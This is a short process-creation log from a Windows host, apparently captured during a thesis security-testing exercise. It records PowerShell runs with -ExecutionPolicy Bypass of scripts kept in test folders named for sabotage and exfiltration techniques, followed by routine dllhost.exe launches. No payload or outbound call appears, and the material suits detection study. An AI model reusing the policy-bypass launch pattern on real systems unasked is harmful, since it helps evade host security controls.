+1783857469134,2026-07-12T11:57:06Z,12028,8452,powershell.exe,"powershell.exe  -NoProfile -ExecutionPolicy Bypass -File ""C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-008_Sabotaje\crear_directorio_dummy.ps1"" ","""cmd.exe"" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File ""C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-008_Sabotaje\crear_directorio_dummy.ps1"" ",explorer.exe <- powershell.exe <- cmd.exe <- powershell.exe,C.364907172793f8c7
+1783857469134,2026-07-12T11:57:34Z,12104,11516,cmd.exe,"""cmd.exe"" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File ""C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-009_Exfiltracion\crear_directorio_dummy.ps1"" ","""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ",explorer.exe <- powershell.exe <- cmd.exe,C.364907172793f8c7
+1783857469134,2026-07-12T11:57:35Z,11516,620,powershell.exe,"powershell.exe  -NoProfile -ExecutionPolicy Bypass -File ""C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-009_Exfiltracion\crear_directorio_dummy.ps1"" ","""cmd.exe"" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File ""C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-009_Exfiltracion\crear_directorio_dummy.ps1"" ",explorer.exe <- powershell.exe <- cmd.exe <- powershell.exe,C.364907172793f8c7
+1783857587544,2026-07-12T11:58:41Z,904,7972,dllhost.exe,"""C:\Windows\system32\DllHost.exe"" /Processid:{4A616E61-3BFE-4F5C-937F-B8602BF16679}",C:\Windows\system32\svchost.exe -k DcomLaunch -p,wininit.exe <- services.exe <- svchost.exe <- dllhost.exe,C.364907172793f8c7
+1783857587544,2026-07-12T11:58:49Z,904,5264,dllhost.exe,,C:\Windows\system32\svchost.exe -k DcomLaunch -p,Null,C.364907172793f8c7
+1783857587544,2026-07-12T11:58:54Z,904,6288,dllhost.exe,C:\Windows\system32\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5},C:\Windows\system32\svchost.exe -k DcomLaunch -p,wininit.exe <- services.exe <- svchost.exe <- dllhost.exe,C.364907172793f8c7
+1783857587544,2026-07-12T11:59:25Z,904,492,dllhost.exe,"""C:\Windows\system32\DllHost.exe"" /Processid:{4A616E61-3BFE-4F5C-937F-B8602BF16679}",C:\Windows\system32\svchost.exe -k DcomLaunch -p,wininit.exe <- services.exe <- svchost.exe <- dllhost.exe,C.364907172793f8c7
